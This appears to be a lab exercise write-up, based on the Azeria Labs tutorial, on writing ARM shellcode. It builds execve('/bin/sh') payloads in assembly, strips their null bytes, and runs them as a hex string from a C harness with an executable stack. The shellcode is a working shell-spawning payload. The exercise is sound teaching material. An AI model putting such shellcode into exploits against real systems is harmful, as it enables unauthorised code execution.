# Azeria Labs: Introduction To Writing ARM Shellcode

This is based on: https://azeria-labs.com/writing-arm-shellcode/.
This is the 64 bit Version.

Working directory is:
```
~/challenges/challenge47
```

## Understanding System Functions

We can check the source code of `write()`:

```
(gdb) disas write
Dump of assembler code for function write:
   0xf7763f80 <+0>:     ldr.w   r12, [pc, #74]  ; 0xf7763fce
   0xf7763f84 <+4>:     add     r12, pc
   0xf7763f86 <+6>:     ldr.w   r12, [r12]
   0xf7763f8a <+10>:    teq     r12, #0
   0xf7763f8e <+14>:    push    {r7}
   0xf7763f90 <+16>:    bne.n   0xf7763fa4 <write+36>
   0xf7763f92 <+18>:    movs    r7, #4
   0xf7763f94 <+20>:    svc     0
   0xf7763f96 <+22>:    pop     {r7}
   0xf7763f98 <+24>:    cmn.w   r0, #4096       ; 0x1000
   0xf7763f9c <+28>:    it      cc
   0xf7763f9e <+30>:    bxcc    lr
   0xf7763fa0 <+32>:    b.w     0xf76f2990 <__syscall_error>
   0xf7763fa4 <+36>:    push    {r0, r1, r2, r3, lr}
   0xf7763fa6 <+38>:    bl      0xf7777a88 <__libc_enable_asynccancel>
   0xf7763faa <+42>:    mov     r12, r0
   0xf7763fac <+44>:    pop     {r0, r1, r2, r3}
   0xf7763fae <+46>:    movs    r7, #4
   0xf7763fb0 <+48>:    svc     0
   0xf7763fb2 <+50>:    mov     r7, r0
   0xf7763fb4 <+52>:    mov     r0, r12
   0xf7763fb6 <+54>:    bl      0xf7777b10 <__libc_disable_asynccancel>
   0xf7763fba <+58>:    mov     r0, r7
   0xf7763fbc <+60>:    ldr.w   lr, [sp], #4
   0xf7763fc0 <+64>:    pop     {r7}
   0xf7763fc2 <+66>:    cmn.w   r0, #4096       ; 0x1000
   0xf7763fc6 <+70>:    it      cc
   0xf7763fc8 <+72>:    bxcc    lr
   0xf7763fca <+74>:    b.w     0xf76f2990 <__syscall_error>
```

And to re-write it in our own shellcode:
```
root@hlUbuntu32:~/challenges/challenge47# cat write.s
.data
string: .asciz "Azeria Labs\n"  @ .asciz adds a null-byte to the end of the string
after_string:
.set size_of_string, after_string - string

.text
.global _start

_start:
   mov r0, #1               @ STDOUT
   ldr r1, addr_of_string   @ memory address of string
   mov r2, #size_of_string  @ size of string
   mov r7, #4               @ write syscall
   swi #0                   @ invoke syscall

_exit:
   mov r7, #1               @ exit syscall
   swi 0                    @ invoke syscall

addr_of_string: .word string
```

Lets execute it:
```
root@hlUbuntu32:~/challenges/challenge47# ./write
Azeria Labs
```

## Syscall Number and Parameters

Execve Shellcode Source `execve1.s`:
```
/* execve() assembly code from the tutorial 'Writing ARM Shellcode' (https://azeria-labs.com/writing-arm-shellcode/),
first example containing null-bytes */

.section .text
.global _start

_start:
        add r0, pc, #12
        mov r1, #0
        mov r2, #0
        mov r7, #11
        svc #0

.ascii "/bin/sh\0"
```

Lets execute it:

```
root@hlUbuntu32:~/challenges/challenge47# ./execve1
#
```

## De-Nullify Shellcode

Execve Shellcode without NULL's in code Source `execve2.s`:
```
/* execve() assembly code from the tutorial 'Writing ARM Shellcode' (https://azeria-labs.com/writing-arm-shellcode/),
second example containing one null-byte */

.section .text
.global _start

_start:
        .code 32
        add r3, pc, #1
        bx  r3

        .code 16
        add r0, pc, #8
        eor r1, r1, r1
        eor r2, r2, r2
        mov r7, #11
        svc #1
        mov r5, r5

.ascii "/bin/sh\0"
```

Test it:
```
root@hlUbuntu32:~/challenges/challenge47# ./execve2
#
```

Execve without NULL in string source `execve3.s`:
```
/* execve() assembly code from the tutorial 'Writing ARM Shellcode' (https://azeria-labs.com/writing-arm-shellcode/), thrid example without null-bytes */
.section .text
.global _start

_start:
        .code 32
        add r3, pc, #1
        bx  r3

        .code 16
        add r0, pc, #8
        eor r1, r1, r1
        eor r2, r2, r2
        strb r2, [r0, #7]
        mov r7, #11
        svc #1

.ascii "/bin/shx"
```

Note: If you execute this, you'll receive a segmentation fault at the
`strb` instruction. Do you know the reason?


## Transform Shellcode into Hex string

Copy the content of the program into a separate file:
```
$ objcopy -O binary execve3 execve3.bin
```

And use the python script to convert it:
```
$ ./toshellcode.py execve3.bin
```

You can try it in the following program:
```
#include <stdio.h>
#include <string.h>

// Len: 28
char *shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78";

int main(void) {
        char s[32];
        memcpy(s, shellcode, 28);

        ( *( void(*)() ) s)();
}
```

Note that we have to copy the shellcode into a stack variable.
We also have to compile it with executable stack enabled.


# Questions

## Questions
* Why does `execve3` not execute?
* Why do we have to copy the shellcode to the stack in `execve3.s`?
* Why do we enable executable stack on `execve3.s` ?

## Answers
All three questions have the same answer. The shellcode is modifying part of
itself (the string), so it has to be writeable. But it will also be executed, so
we have to enable executable stack.
